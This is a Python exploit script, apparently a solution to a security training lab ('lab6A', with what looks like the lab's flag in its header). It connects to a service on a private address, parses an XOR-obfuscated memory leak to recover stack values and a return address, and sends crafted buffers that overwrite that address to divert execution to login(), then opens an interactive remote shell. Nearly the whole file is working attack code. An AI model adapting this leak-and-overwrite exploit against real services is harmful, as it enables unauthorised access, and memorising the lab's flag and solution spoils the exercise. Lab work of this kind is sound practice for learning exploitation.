#!/usr/bin/env python3
#
# lab6A:strncpy_1s_n0t_s0_s4f3_l0l
#

import struct
import socket

def main():

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("192.168.159.150", 6642))
  sock.settimeout(1)

  if len(recvall(sock)) > 1:
    print("[*] banner recieved, continuing exploitation")
  else:
    print("[-] banner grab failed exiting...")
    exit(-1)

  stager = generate_buffer()

  # send the username and password buffers to leak the addresses / variables
  sock.send(stager[0])
  recvall(sock)
  sock.send(stager[1])
  line = recvall(sock)

  if b"Authentication failed" in line:
    stager = generate_buffer(parse_info_leak(line), 0xdeadbeef)
  else:
    print("[-] exploitation failed, restart service")
    exit(-1)

  sock.send(stager[0])
  recvall(sock)
  sock.send(stager[1])
  recvall(sock)

  while True:
    sock.send(b"\n")
    if b"WELCOME" in recvall(sock):
      break

  print("[+] Exploitation complete, enjoy the shell ;)\n")
  while True:
    try:
      sock.send(input("wetw0rk> ").encode('latin-1') + b"\n")
      print(recvall(sock).decode('latin-1'))
    except:
      print("[-] Exiting shell...")


# generate_buffer: generate the username and password buffer, either for the leak or exploit
def generate_buffer(var_addrs=None, return_address=0x00000000):

  offset = b"B" * 12
  buffers = ["", ""]
  buffer_size = 32

  buffers[0] = b"A" * buffer_size + b'\n'

  if (return_address == 0xdeadbeef):

    login_addr = var_addrs["nohash"]["ret_addr"] - 0x48a

    print("[+] login() at 0x%02x, overwriting return address" % login_addr)

    local_14 = struct.pack("<I", generate_addr(var_addrs["hashed"]["local_14"], 0xdeadbeef))
    local_10 = struct.pack("<I", generate_addr(var_addrs["hashed"]["local_10"], 0xfffffffe))
    ret_addr = struct.pack("<I", generate_addr(var_addrs["hashed"]["ret_addr"], login_addr))

  else:

    local_14 = b"BBBB"
    local_10 = b"BBBB"
    ret_addr = b"B"

  payload_buffer = (b"%b%b%b%b" % (local_14, local_10, offset, ret_addr))
  rest = b"B" * (buffer_size - (
    len(payload_buffer)
    )
  )

  buffers[1] = payload_buffer + rest + b'\n'

  return buffers

# generate_addr: using the leaked value generate a value / address later to be XOR'd. this
#                value once XOR'd will become our wanted address
def generate_addr(current_address, wanted_address):

  print("[*] generating buffer for 0x%x -> 0x%x" % (current_address, wanted_address))

  hex_str = hex(current_address)[2:]
  c_array = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]

  hex_str = hex(wanted_address)[2:]
  w_array = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]

  for i in range(4):
    c = int(c_array[i], 16)
    w = int(w_array[i], 16)
    w_array[i] = find_byte(c, w)

    w_array[i] = find_byte(0x41, w_array[i])
    print("[*] sending 0x%02x" % w_array[i])

  return format_address(w_array)

# find_byte: find what integer is needed to be XOR'd by the static_byte to equate the wanted_byte
def find_byte(static_byte, wanted_byte):

  byte = 0
  for i in range(266):
    if ( (static_byte ^ i) == wanted_byte ):
      byte = i
  
  if byte == 0:
    print("[-] failed to generate byte 0x%02x" % wanted_byte)

  return byte

# parse_info_leak: extract current variable values as well as the return address in both normal
#                  format and XOR'd format to later be used for crafting the exploit buffer
def parse_info_leak(leak):

  variables =\
  {
    "hashed": { "local_14": 0x00000000, "local_10": 0x00000000, "ret_addr": 0x00000000 },
    "nohash": { "local_14": 0x00000000, "local_10": 0x00000000, "ret_addr": 0x00000000 }
  }

  # XOR decrypt the leak, with 0x03 (A ^ B == 0x03)
  nohash = bytearray()
  for i in range(len(leak)):
    nohash.append(leak[i] ^ 0x03)

  # extract the hashed values (this is what is currently stored in memory)
  i = leak.find(b"\xfc\xfc\xfc\xfc")
  j = nohash.find(b"\xff\xff\xff\xff")

  variables["hashed"]["local_14"] = format_address(leak[i:   ][:4][::-1])
  variables["hashed"]["local_10"] = format_address(leak[i+4: ][:4][::-1])
  variables["hashed"]["ret_addr"] = format_address(leak[i+20:][:4][::-1])

  variables["nohash"]["local_14"] = format_address(nohash[i:   ][:4][::-1])
  variables["nohash"]["local_10"] = format_address(nohash[i+4: ][:4][::-1])
  variables["nohash"]["ret_addr"] = format_address(nohash[i+20:][:4][::-1])

  print("[*] leaked main() -> 0x%x -> 0x%x" % (
    variables["nohash"]["ret_addr"],
    variables["hashed"]["ret_addr"]
    )
  )

  return variables

# format_address: format a string into a base 16 integer
def format_address(str_buff):

  try:
    int_fmt = int("0x{:02x}{:02x}{:02x}{:02x}".format(
      str_buff[0], str_buff[1],
      str_buff[2], str_buff[3]),
    16)
  except:
    print("[-] failed to format address")
    exit(-1)

  return int_fmt

# recvall: get all data from the servers response, not just newlines
def recvall(sockfd):

  # i used the timeout to handle EOF from sockfd
  data = b''
  while True:
    try:
      data += sockfd.recv(4096)
    except:
      break

  return data

main()
